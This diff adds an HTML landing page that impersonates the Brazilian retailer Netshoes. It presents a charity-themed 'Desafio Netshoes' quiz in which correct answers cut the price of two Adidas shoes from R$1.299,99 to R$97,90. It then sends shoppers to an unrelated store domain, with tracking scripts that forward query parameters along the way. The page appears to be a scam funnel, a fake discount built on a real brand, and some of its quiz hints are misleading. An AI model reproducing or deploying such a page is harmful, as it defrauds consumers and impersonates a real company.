@@ -1,0 +1,203 @@
+<html lang="pt-br"><head>
+<script src="js/latest_1.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script src="js/latest_2.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.onload = function () {
+    var links = document.getElementsByTagName("a");
+    for (var i = 0, n = links.length; i < n; i++) {
+      if (links[i].href.includes("#")) {
+        continue;
+      }
+
+      var href =
+        links[i].href.trim() +
+        (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+        document.location.search.replace("?", "").toString();
+      links[i].href = href;
+    }
+  };
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netshoes Oficial - Tênis, Roupas e Artigos Esportivos</title>
+    <link rel="stylesheet" href="css/styles.css">
+
+    <link href="css/css2.css" rel="stylesheet">
+
+    </head><body><div class="header">
+        <img src="images/LOGO1.png" alt="Logo">
+    </div>
+
+    <div class="titllee">
+        <h1>Bem-vindo ao <br>Desafio Netshoes</h1>
+    </div>
+
+
+    <div class="container ">
+        <div class="content ">
+            <!-- Tela inicial do quiz -->
+            <div id="start-screen" class="quiz-screen ">
+
+                <p>Participe do nosso emocionante desafio especial Fevereiro Roxo da Netshoes e ganhe acesso a uma <strong>SUPER OFERTA!</strong>
+                    <br><br>
+                    Ao completar o desafio com sucesso, você terá acesso a uma oferta exclusiva do corre da causa, dois tênis, <strong>o Adidas Duramo RC e Duramo SL!</strong>
+                </p>
+                <button id="start-quiz" class="btn">COMEÇAR DESAFIO</button>
+
+            </div>
+
+            <!-- Pergunta 1 -->
+            <div id="question-1" class="quiz-screen hidden">
+                <p>Qual é um dos principais benefícios da prática regular de corrida?</p>
+                <div class="options">
+                    <button class="option incorrect">Aumento da pressão arterial</button>
+                    <button class="option incorrect">Diminuição da resistência física</button>
+					<button class="option correct">Melhora da saúde cardiovascular</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$1.299,99</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 2 -->
+            <div id="question-2" class="quiz-screen hidden">
+                <p>Em qual ano a Adidas foi fundada?</p>
+                <div class="options">
+                    <button class="option incorrect">1990</button>
+                    <button class="option correct">1949</button>
+                    <button class="option incorrect">2000</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$599,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$700,00</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 3 -->
+            <div id="question-3" class="quiz-screen hidden">
+                <p>Qual é uma das principais melhorias do Tênis Adidas Duramo RC em comparação ao Adidas Adizero?</p>
+                <div class="options">
+					<button class="option correct">Aumento da durabilidade da borracha Gripper em 40%</button>
+                    <button class="option incorrect">Redução do peso do tênis</button>
+                    <button class="option incorrect">Aumento do número de cores disponíveis</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$455,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$245,00</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 4 -->
+            <div id="question-4" class="quiz-screen hidden">
+                <p>Qual é o principal objetivo da campanha Fevereiro Roxo?</p>
+                <div class="options">
+                    <button class="option incorrect">Promover o câncer de pulmão</button>
+                    <button class="option incorrect">Incentivar a prática de esportes</button>
+					<button class="option correct">Conscientizar sobre o Lupus e Alzheimer</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$55,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$190,00</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 5 -->
+            <div id="question-5" class="quiz-screen hidden">
+                <p>Qual é o destino dos lucros das vendas dos Tênis?</p>
+                <div class="options">
+                    <button class="option correct">Santa Casa de Porto Alegre</button>
+                    <button class="option incorrect">Hospital das Clínicas</button>
+                    <button class="option incorrect">Abrigos de animais</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$92,10</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$97,90</p>
+                </div>
+            </div>
+
+
+
+            <!-- Tela de conclusão do quiz -->
+            <div id="end-screen" class="quiz-screen hidden">
+                <h2>PARABÉNS!</h2><br>
+                <p class="p-resgate">Você acaba de ganhar um super desconto no CORRE DA CAUSA!<br><b>Dois Tênis Adidas Duramo RC e Duramo SL!<br><br></b>DE R$1.299,99<br><b>POR APENAS R$97,90</b></p>
+                <a href="https://desafioroxo.store/2/loja/" class="btn btn-resgate" id="umdoistrestplink1">RESGATAR AGORA</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- popUp para selecionar alguma pergunta -->
+    <div class="selecione-resposta hidden ">
+        <p class="selecione-resposta-p">SELECIONE UMA PERGUNTA!</p>
+        <button class="btn back-btn">VOLTAR</button>
+    </div>
+
+
+    <!-- popUp para selecionar alguma pergunta -->
+    <div class="dica ">
+        <div class="dica-1 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: Pense em como a corrida pode impactar a saúde do coração e o bem-estar geral.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+
+        <div class="dica-2 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: A marca foi criada em um período em que o esporte estava começando a ganhar popularidade no Brasil, bem antes do novo milênio.
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </p></div>
+
+        <div class="dica-3 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+               Dica: Considere a importância da durabilidade em calçados esportivos e como isso pode influenciar o desempenho nas corridas.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+
+        <div class="dica-4 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: Pense em campanhas que buscam aumentar a conscientização sobre doenças e a importância do diagnóstico precoce.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+
+        <div class="dica-5 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: Lembre-se de que o lucro é destinado a uma instituição de saúde que apoia o tratamento e a conscientização sobre o câncer.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+    </div>
+
+    <div class="footer">
+
+    </div>
+    <script src="js/script.js"></script>
+	
+</body></html>
